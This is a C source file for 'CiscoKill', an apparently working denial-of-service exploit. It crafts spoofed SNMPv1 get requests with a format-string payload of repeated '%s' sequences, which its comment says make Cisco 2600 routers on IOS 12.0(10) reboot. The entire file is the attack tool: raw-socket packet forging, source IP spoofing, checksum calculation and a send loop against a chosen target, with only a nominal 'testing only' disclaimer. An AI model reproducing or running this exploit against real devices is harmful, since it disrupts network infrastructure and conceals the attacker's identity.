
/* This program send a spoofed snmpv1 get request that cause system reboot
   on Cisco 2600 routers with IOS version 12.0(10) 

   Author : kundera@tiscali.it   ... don't be lame use for testing only! ..:) */

#include 		<stdio.h>
#include 		<string.h>
#include 		<unistd.h>
#include 		<stdlib.h>
#include 		<sys/socket.h>
#include 		<netinet/in.h>
#include		<netinet/ip.h>
#include		<netinet/udp.h>
#include		<arpa/inet.h>

	

struct in_addr sourceip_addr;
struct in_addr destip_addr;
struct sockaddr_in dest;

struct ip          *IP;  
struct udphdr      *UDP;   
int p_number=1,sok,datasize,i=0; 

char *packet,*source,*target; 
char *packetck;
char *data,c;

char snmpkill[] =  
  "\x30\x81\xaf\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x81"  
  "\xa1\x02\x02\x09\x28\x02\x01\x00\x02\x01\x00\x30\x81\x94\x30\x81"  
  "\x91\x06\x81\x8c\x4d\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73\x25\x73"  
  "\x25\x73\x25\x73\x25\x73\x81\xff\xff\xff\xff\xff\xff\xff\xff\x7f"  
  "\x05";


struct pseudoudp {
u_long ipsource;
u_long ipdest;
char zero;
char proto;
u_short length;
} *psudp;


in_cksum (unsigned short *ptr, int nbytes)
{

  register long sum;		/* assumes long == 32 bits */
  u_short oddbyte;
  register u_short answer;	/* assumes u_short == 16 bits */

  /*
   * Our algorithm is simple, using a 32-bit accumulator (sum),
   * we add sequential 16-bit words to it, and at the end, fold back
   * all the carry bits from the top 16 bits into the lower 16 bits.
   */

  sum = 0;
  while (nbytes > 1)
    {
      sum += *ptr++;
      nbytes -= 2;
    }

  /* mop up an odd byte, if necessary */
  if (nbytes == 1)
    {
      oddbyte = 0;		/* make sure top half is zero */
      *((u_char *) & oddbyte) = *(u_char *) ptr;	/* one byte only */
      sum += oddbyte;
    }

  /*
   * Add back carry outs from top 16 bits to low 16 bits.
   */

  sum = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
  sum += (sum >> 16);		/* add carry */
  answer = ~sum;		/* ones-complement, then truncate to 16 bits */
  return (answer);
}


void usage (void)
{
printf("Kundera CiscoKill v1.0\n");
printf("Usage: ciscokill [-n number of packets] [-s source ip_addr] -t ip_target \n");
}



int main(int argc,char **argv){

if (argc < 2){
usage();
exit(1);
}

while((c=getopt(argc,argv,"s:t:n:"))!=EOF){
	switch(c) {
	 case 's': source=optarg; break;
	 case 'n': p_number=atoi(optarg); break;
	 case 't': target=optarg;
	 }
}

if ( (sok=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)
{
	printf("Can't create socket.\n");
        exit(EXIT_FAILURE);
}

destip_addr.s_addr=inet_addr(target);
sourceip_addr.s_addr=inet_addr(source);

datasize=sizeof(snmpkill);

packet = ( char * )malloc( 20 + 8 + datasize );

IP     = (struct ip     *)packet; 

memset(packet,0,sizeof(packet)); 
        
        IP->ip_dst.s_addr  = destip_addr.s_addr;
        IP->ip_src.s_addr  = sourceip_addr.s_addr;
        IP->ip_v = 4;
        IP->ip_hl = 5;
        IP->ip_ttl = 245;
        IP->ip_id = htons(666);
        IP->ip_p = 17;
        IP->ip_len  = htons(20 + 8 + datasize);
        IP->ip_sum    = in_cksum((u_short *)packet,20);

 
UDP   = (struct udphdr    *)(packet+20);
      UDP->source = htons(666); 
      UDP->dest   = htons(161);
      UDP->len     = htons(8+datasize);
      UDP->check = 0;
      packetck = (char *)malloc(8 + datasize + sizeof(struct pseudoudp));
      bzero(packetck,8 + datasize + sizeof(struct pseudoudp));     
      psudp = (struct pseudoudp *) (packetck);
      psudp->ipdest = destip_addr.s_addr;
      psudp->ipsource = sourceip_addr.s_addr;
      psudp->zero = 0;
      psudp->proto = 17;
      psudp->length = htons(8+datasize);
      memcpy(packetck+sizeof(struct pseudoudp),UDP,8+datasize);
      memcpy(packetck+sizeof(struct pseudoudp)+8,snmpkill,datasize);

      UDP->check = in_cksum((u_short *)packetck,8+datasize+sizeof(struct pseudoudp));    

data   = (unsigned char    *)(packet+20+8); 
memcpy(data,snmpkill,datasize);  
                                                                                                     
dest.sin_family=AF_INET;
dest.sin_addr.s_addr=destip_addr.s_addr;                                                                        

while (i<p_number)
{
if (( sendto(sok,packet,20+8+datasize,0,( struct sockaddr * ) &dest,sizeof(dest)))<0)
{
printf("Error sending packet.\n");
exit(EXIT_FAILURE);
}

i++;

}
printf("%d packets sent.\n",i);

}




